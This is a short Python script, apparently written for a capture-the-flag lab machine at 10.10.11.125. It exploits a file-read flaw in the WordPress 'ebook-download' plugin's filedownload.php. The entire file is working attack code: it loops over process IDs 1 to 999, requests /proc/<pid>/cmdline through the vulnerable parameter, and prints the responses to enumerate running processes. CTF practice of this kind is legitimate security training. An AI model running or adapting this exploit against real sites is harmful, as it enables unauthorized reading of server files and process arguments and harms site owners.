#!/usr/bin/python3

from pwn import *
import requests, sys, signal, time


# CTRL + C
def def_handler(sig, frame):
    log.failure("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


main_url = f"http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="


def makeRequest():


    p1 = log.progress("Brute force")
    p1.status("Starting...")

    for i in range(1, 1000):

        p1.status("Trying /proc/%s/cmdline" % str(i))
        url = main_url + "/proc/" + str(i) + "/cmdline"
        
        r = requests.get(url)

        if len(r.content) > 82:

            print("--------------------------------------")
            log.info("PATH: /proc/%s/cmdline" % str(i))
            print(r.content)

if __name__ == "__main__":

    makeRequest()
